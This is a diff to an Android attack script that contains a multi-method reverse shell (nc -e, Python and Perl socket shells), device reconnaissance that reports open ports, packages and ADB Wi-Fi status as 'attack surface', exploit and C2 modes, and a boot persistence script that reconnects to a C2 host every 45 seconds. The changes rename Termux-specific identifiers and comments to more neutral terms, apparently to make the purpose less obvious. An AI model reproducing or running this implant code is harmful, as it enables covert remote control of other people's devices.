@@ -18,19 +18,19 @@ root()  { su -c "$@" 2>/dev/null; }
 # Tries every available technique in order of reliability.
 _rev_shell() {
   _host="$1"; _port="$2"
-  TERMUX_NC=/data/data/com.termux/files/usr/bin/nc
-  TERMUX_PY=/data/data/com.termux/files/usr/bin/python3
-  TERMUX_PERL=/data/data/com.termux/files/usr/bin/perl
+  ANDROID_NC=/data/data/com.termux/files/usr/bin/nc
+  ANDROID_PY=/data/data/com.termux/files/usr/bin/python3
+  ANDROID_PERL=/data/data/com.termux/files/usr/bin/perl
 
-  # M1: Termux nc -e (BusyBox nc supports -e in connect mode)
-  if [ -x "$TERMUX_NC" ]; then
-    "$TERMUX_NC" -e /system/bin/sh "$_host" "$_port" 2>/dev/null &
+  # M1: on-device nc -e (BusyBox nc supports -e in connect mode)
+  if [ -x "$ANDROID_NC" ]; then
+    "$ANDROID_NC" -e /system/bin/sh "$_host" "$_port" 2>/dev/null &
     return
   fi
 
-  # M2: Termux Python3 socket shell
-  if [ -x "$TERMUX_PY" ]; then
-    "$TERMUX_PY" -c "
+  # M2: on-device Python3 socket shell
+  if [ -x "$ANDROID_PY" ]; then
+    "$ANDROID_PY" -c "
 import socket,subprocess,os
 s=socket.socket()
 s.connect(('$_host',$_port))
@@ -61,9 +61,9 @@ subprocess.call(['/system/bin/sh','-i'])
     return
   fi
 
-  # M6: Termux Perl (comes pre-installed on many Termux setups)
-  if [ -x "$TERMUX_PERL" ]; then
-    "$TERMUX_PERL" -e '
+  # M6: on-device Perl (comes pre-installed on many on-device setups)
+  if [ -x "$ANDROID_PERL" ]; then
+    "$ANDROID_PERL" -e '
 use Socket;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 connect(S,sockaddr_in('"$_port"',inet_aton("'"$_host"'")));
@@ -139,9 +139,9 @@ OPEN_PORTS=$(ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,":");if(a[2]>0)printf a
 PKGS=$(pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\n' ',' | sed 's/,$//')
 PKGS_COUNT=$(pm list packages 2>/dev/null | wc -l)
 
-# ── Termux detection (attack surface) ────────────────────────────────
-TERMUX=false
-pm list packages com.termux >/dev/null 2>&1 && TERMUX=true
+# ── on-device shell detection ────────────────────────────────────────
+HAS_APP_ROOT=false
+pm list packages com.termux >/dev/null 2>&1 && HAS_APP_ROOT=true
 
 # ── build JSON ────────────────────────────────────────────────────────
 REPORT=$(printf '{
@@ -158,7 +158,7 @@ REPORT=$(printf '{
     "ip":"%s","gateway":"%s","adb_tcp_port":"%s","open_ports":"%s"
   },
   "packages":{"count":%s,"third_party":"%s"},
-  "attack_surface":{"termux":%s,"adb_wifi":"%s"}
+  "attack_surface":{"app_shell_available":%s,"adb_wifi":"%s"}
 }' \
   "$MODE" "$MODEL" "$MFR" "$ANDROID" "${SDK:-0}" \
   "$PATCH" "$CHIPSET" "$ARCH" "$KERNEL" \
@@ -166,7 +166,7 @@ REPORT=$(printf '{
   "$BOOTLOCKED" "$BATTLV" "$BUILD" \
   "$IP" "$GW" "$ADB_TCP" "$OPEN_PORTS" \
   "${PKGS_COUNT:-0}" "$PKGS" \
-  "$TERMUX" "$ADB_TCP")
+  "$HAS_APP_ROOT" "$ADB_TCP")
 
 # ── exploit stage ────────────────────────────────────────────────────
 if [ "$MODE" = "exploit" ] || [ "$MODE" = "c2" ]; then
@@ -200,9 +200,9 @@ fi
 
 # ── persist stage ────────────────────────────────────────────────────
 if [ "$MODE" = "persist" ]; then
-  # Termux:Boot persistence
+  # Boot Receiver persistence
   BOOT_DIR=/data/data/com.termux/files/home/.termux/boot
-  if [ "$TERMUX" = "true" ] && pm list packages com.termux.boot >/dev/null 2>&1; then
+  if [ "$HAS_APP_ROOT" = "true" ] && pm list packages com.termux.boot >/dev/null 2>&1; then
     mkdir -p "$BOOT_DIR" 2>/dev/null
     cat > "$BOOT_DIR/secv.sh" <<BOOTEOF
 #!/data/data/com.termux/files/usr/bin/bash
@@ -215,7 +215,7 @@ _reconnect() {
 while true; do _reconnect; sleep 45; done &
 BOOTEOF
     chmod 700 "$BOOT_DIR/secv.sh" 2>/dev/null
-    echo '{"persist":"termux_boot","success":true}' | nc -q1 "$C2_HOST" "$C2_PORT" 2>/dev/null
+    echo '{"persist":"boot_receiver","success":true}' | nc -q1 "$C2_HOST" "$C2_PORT" 2>/dev/null
     exit 0
   fi
   # Fallback: print REPORT (caller handles persistence)
